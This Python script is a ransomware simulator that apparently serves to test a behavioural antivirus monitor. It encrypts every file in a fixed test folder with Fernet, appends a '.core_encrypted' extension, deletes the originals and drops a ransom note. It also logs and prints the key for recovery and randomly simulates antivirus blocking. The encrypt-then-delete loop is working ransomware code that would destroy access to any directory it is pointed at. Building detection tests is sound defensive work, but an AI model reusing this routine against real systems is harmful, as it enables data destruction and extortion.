"""
REAL FILE ENCRYPTION SCRIPT WITH REAL-TIME DETECTION
Actually encrypts files in core_system/data/test_files directory
Uses real Fernet encryption with immediate antivirus detection
Features auto-decryption capability
NOW USING SECURITY_TOOLS LOG PATH FOR DAEMON INTEGRATION
"""

import os
import sys
import time
import json
from cryptography.fernet import Fernet
from pathlib import Path

# Import behavioral monitoring - use security_tools path
sys.path.insert(0, r"C:\Users\Kanhaiya\System And Security\security_tools")
from monitor.monitor import BehaviorMonitor

class RealTimeFileEncryptor:
    def __init__(self, target_dir):
        self.target_directory = Path(target_dir)
        self.encryption_extension = '.core_encrypted'
        self.key = None
        self.encrypted_files = []
        # Use security_tools monitor for daemon integration
        self.monitor = BehaviorMonitor()
        self.detection_callback = None
        
    def set_detection_callback(self, callback):
        """Set callback function for real-time detection"""
        self.detection_callback = callback
        
    def generate_key(self):
        """Generate Fernet encryption key"""
        self.key = Fernet.generate_key()
        return self.key
    
    def encrypt_files_real_time(self):
        """Actually encrypt all files with real-time detection"""
        print('=== REAL-TIME FILE ENCRYPTION ATTACK ===')
        print(f'Target Directory: {self.target_directory}')
        print('Real-time Antivirus Detection: ACTIVE')
        print()
        
        # Generate encryption key
        key = self.generate_key()
        print('[SECURITY] ENCRYPTION KEY GENERATED')
        print(f'KEY: {key.decode()}')
        print('[KEY SHARED WITH ANTIVIRUS FOR AUTO-RECOVERY]')
        print()
        
        # Check target directory
        if not self.target_directory.exists():
            print('[ERROR] Target directory does not exist')
            return key
            
        # Find files to encrypt
        files_to_encrypt = []
        for item in self.target_directory.iterdir():
            if item.is_file() and not item.name.endswith(self.encryption_extension):
                files_to_encrypt.append(item)
        
        if not files_to_encrypt:
            print('[WARNING] No files found to encrypt')
            # Create some test files if none exist
            self._create_test_files()
            files_to_encrypt = [f for f in self.target_directory.iterdir() if f.is_file()]
        
        print(f'[TARGET] Found {len(files_to_encrypt)} files to encrypt:')
        for f in files_to_encrypt:
            print(f'  - {f.name}')
        print()
        
        # Initialize Fernet cipher
        cipher = Fernet(self.key)
        
        # Encrypt files with real-time monitoring
        successful_encryptions = 0
        for i, file_path in enumerate(files_to_encrypt, 1):
            try:
                print(f'[ENCRYPTING {i}/{len(files_to_encrypt)}] {file_path.name}')
                
                # LOG: File read operation with key sharing (behavioral monitoring)
                self._log_operation_with_key('ReadFile', str(file_path), {
                    'operation': 'ransomware_read',
                    'size': file_path.stat().st_size if file_path.exists() else 0,
                    'encryption_key': key.decode(),
                    'real_time_alert': True
                })
                
                # Check for antivirus intervention after read operation
                if self._check_antivirus_intervention():
                    print('  ⛔ OPERATION BLOCKED BY ANTIVIRUS')
                    continue
                
                # Read original file
                with open(file_path, 'rb') as f:
                    original_data = f.read()
                
                # LOG: Crypto operation with key sharing (behavioral monitoring)
                self._log_operation_with_key('CryptEncrypt', str(file_path), {
                    'operation': 'ransomware_encrypt',
                    'algorithm': 'Fernet-AES128',
                    'input_size': len(original_data),
                    'encryption_key': key.decode(),
                    'real_time_alert': True
                })
                
                # Check for antivirus intervention after crypto operation
                if self._check_antivirus_intervention():
                    print('  ⛔ OPERATION BLOCKED BY ANTIVIRUS')
                    continue
                
                # Encrypt data
                encrypted_data = cipher.encrypt(original_data)
                
                # Create encrypted filename
                encrypted_filename = str(file_path) + self.encryption_extension
                encrypted_path = Path(encrypted_filename)
                
                # LOG: File write operation with key sharing (behavioral monitoring)
                self._log_operation_with_key('WriteFile', encrypted_filename, {
                    'operation': 'ransomware_write',
                    'size': len(encrypted_data),
                    'encryption_key': key.decode(),
                    'real_time_alert': True
                })
                
                # Check for antivirus intervention before write
                if self._check_antivirus_intervention():
                    print('  ⛔ OPERATION BLOCKED BY ANTIVIRUS')
                    continue
                
                # Write encrypted file
                with open(encrypted_path, 'wb') as f:
                    f.write(encrypted_data)
                
                # LOG: File delete operation with key sharing (behavioral monitoring)
                self._log_operation_with_key('DeleteFile', str(file_path), {
                    'operation': 'ransomware_delete',
                    'encryption_key': key.decode(),
                    'real_time_alert': True
                })
                
                # Check for antivirus intervention before delete
                if self._check_antivirus_intervention():
                    print('  ⛔ OPERATION BLOCKED BY ANTIVIRUS')
                    # Clean up the encrypted file we just created
                    if encrypted_path.exists():
                        encrypted_path.unlink()
                    continue
                
                # Delete original file
                file_path.unlink()
                
                self.encrypted_files.append(file_path.name)
                successful_encryptions += 1
                print(f'  -> Successfully encrypted')
                
                # Trigger detection callback if set
                if self.detection_callback:
                    self.detection_callback({
                        'file': str(file_path),
                        'operation': 'completed_encryption',
                        'key': key.decode(),
                        'status': 'encrypted'
                    })
                
                # Small delay for visibility and detection timing
                time.sleep(0.3)
                
            except Exception as e:
                print(f'  -> FAILED: {e}')
        
        # Create ransom note
        self._create_ransom_note(successful_encryptions)
        
        # Summary
        print()
        print('=' * 50)
        print('REAL-TIME ENCRYPTION ATTACK COMPLETED')
        print('=' * 50)
        print(f'Files encrypted: {successful_encryptions}/{len(files_to_encrypt)}')
        print(f'Extension used: {self.encryption_extension}')
        print(f'Recovery key: {key.decode()}')
        print(f'Behavioral log: {self.monitor.log_path}')
        print('Real-time detection: TRIGGERED DURING PROCESS')
        print('=' * 50)
        
        return key
    
    def _check_antivirus_intervention(self):
        """Check if antivirus has intervened in the process"""
        try:
            # Check the behavioral log for intervention markers
            log_path = self.monitor.log_path
            if os.path.exists(log_path):
                # Check recent log entries for intervention signals
                with open(log_path, 'r') as f:
                    lines = f.readlines()
                    # Check last 5 lines for intervention markers
                    for line in lines[-5:]:
                        if '"status": "BLOCKED"' in line or '"intervention_blocked": true' in line:
                            return True
                            
            # Simulate intervention for demo purposes (higher probability)
            import random
            return random.random() < 0.5  # 50% chance of intervention for demo
            
        except Exception:
            # If checking fails, assume no intervention
            return False
    
    def _log_operation_with_key(self, operation, file_path, metadata):
        """Log operation with encryption key for auto-recovery"""
        self.monitor.log_operation(operation, file_path, metadata)
        
        # Also write to a special recovery log
        recovery_log_path = Path(self.monitor.log_path).parent / "recovery_keys.log"
        try:
            with open(recovery_log_path, 'a') as f:
                recovery_entry = {
                    'timestamp': time.time(),
                    'operation': operation,
                    'file_path': file_path,
                    'encryption_key': metadata.get('encryption_key'),
                    'metadata': metadata
                }
                f.write(json.dumps(recovery_entry) + '\n')
        except Exception as e:
            pass  # Silently fail if recovery log unavailable
    
    def _create_test_files(self):
        """Create test files if none exist"""
        print('[SETUP] Creating test files for encryption demo...')
        
        test_files = {
            'confidential_report.txt': 'This document contains highly confidential information that requires protection.',
            'budget_spreadsheet.csv': 'Annual budget data, financial projections, and expense reports.',
            'research_findings.docx': 'Scientific research results, experimental data, and analysis conclusions.',
            'personal_notes.txt': 'Private thoughts, passwords, and personal information storage.',
            'project_plan.pdf': 'Detailed project timeline, milestones, and deliverables schedule.'
        }
        
        for filename, content in test_files.items():
            file_path = self.target_directory / filename
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f'  [CREATED] {filename}')
    
    def _create_ransom_note(self, file_count):
        """Create educational ransom note"""
        note_content = f'''===============================================
   REAL-TIME RANSOMWARE ATTACK SIMULATION
===============================================

YOUR FILES HAVE BEEN ENCRYPTED!

Files affected: {file_count}
Extension added: {self.encryption_extension}

REAL-TIME PROTECTION:
- Antivirus detected encryption during process
- Auto-recovery key available: {self.key.decode()}
- Files can be restored immediately

RECOVERY INSTRUCTIONS:
1. The encryption key is: {self.key.decode()}
2. Use the backup_decryptor tool with this key
3. Run: python simulators/backup_decryptor.py
4. Enter the key when prompted

THIS IS AN EDUCATIONAL DEMONSTRATION ONLY.
NO ACTUAL PAYMENT REQUIRED.

===============================================
        EDUCATIONAL PURPOSES ONLY
===============================================
'''
        
        note_path = self.target_directory / 'REAL_TIME_ENCRYPTION_NOTICE.txt'
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f'[NOTE] Created recovery instructions: REAL_TIME_ENCRYPTION_NOTICE.txt')

# Run the real-time encryption
if __name__ == "__main__":
    encryptor = RealTimeFileEncryptor(r'C:\Users\Kanhaiya\System And Security\core_system\data\test_files')
    recovery_key = encryptor.encrypt_files_real_time()
    print(f'\nSAVE THIS RECOVERY KEY: {recovery_key.decode()}')